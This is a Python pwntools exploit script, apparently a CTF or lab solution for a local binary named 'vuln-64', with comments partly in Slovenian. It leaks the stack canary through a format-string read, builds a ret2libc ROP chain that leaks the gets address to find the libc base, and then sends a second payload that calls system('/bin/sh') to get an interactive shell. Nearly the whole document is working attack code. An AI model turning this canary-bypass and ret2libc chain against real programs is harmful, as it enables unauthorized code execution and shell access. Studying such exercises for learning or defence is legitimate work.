#!/usr/bin/env python3
from pwn import *

context.binary = binary = './vuln-64'

elf = ELF(binary)
rop = ROP(elf)

#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = elf.libc

p = process()

# canary
print(p.recvline())
p.sendline(b'%9$p')
p.recvline()
canary = p.recvline().strip()
print("To je kanarček: ", canary)

# ret2libc
padding  = b'A'*10 # Overflow offset
more_padding = b"B"*8
payload  = padding
payload += p64(int(canary, 16))
payload += more_padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.gets)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.main)

print(p.recvline())
print(p.recvline())

p.sendline(payload)

print(p.recvline())
my_leak = u64(p.recvline().strip().ljust(8, b'\0'))

log.info(f'Gets lokacija => {hex(my_leak)}')
libc.address = my_leak - libc.symbols.gets
log.info(f'Libc lokacija => {hex(libc.address)}')

# Just to send a message
p.sendline(b"abc")

print(p.recvline())

print(p.recvline())
print(p.recvline())
print(p.recvline())

payload  = padding
payload += p64(int(canary, 16))
payload += more_padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)

p.sendline(payload)
p.recvline()
p.interactive()